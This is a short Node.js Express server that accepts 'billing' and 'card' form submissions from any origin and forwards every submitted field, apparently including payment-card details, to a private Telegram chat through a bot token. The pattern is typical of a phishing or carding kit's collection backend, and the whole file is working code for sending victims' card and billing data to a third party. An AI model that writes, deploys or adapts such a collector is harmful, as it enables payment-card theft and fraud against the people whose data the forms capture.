import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import dotenv from "dotenv";
import crypto from "crypto";
import cors from "cors";

dotenv.config();

const app = express();
app.use(bodyParser.json());
app.use(cors()); // ✅ Allow cross-origin requests

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;

async function sendToTelegram(title, data) {
  const timestamp = new Date().toLocaleString("en-GB", { timeZone: "Africa/Lagos" });

  if (!data.sessionId) {
    data.sessionId = crypto.randomBytes(4).toString("hex");
  }

  let text = `📌 ${title}\n\n🕒 Time: ${timestamp}\n🆔 Session ID: ${data.sessionId}\n\n`;
  for (const [key, value] of Object.entries(data)) {
    text += `• ${key}: ${value}\n`;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text }),
    });

    if (!response.ok) {
      const text = await response.text();
      console.error("Telegram API error:", response.status, text);
    } else {
      console.log("Telegram message sent successfully");
    }

  } catch (err) {
    console.error("Error sending to Telegram:", err);
  }
}

// Billing Form
app.post("/billing", async (req, res) => {
  console.log("Received /billing submission:", req.body);
  try {
    await sendToTelegram("🧾 New Billing Form Submission", req.body);
    res.json({ success: true });
  } catch (err) {
    console.error("Billing submission error:", err);
    res.status(500).json({ success: false });
  }
});

// Card Form
app.post("/card", async (req, res) => {
  console.log("Received /card submission:", req.body);
  try {
    await sendToTelegram("💳 New Card Form Submission", req.body);
    res.json({ success: true });
  } catch (err) {
    console.error("Card submission error:", err);
    res.status(500).json({ success: false });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
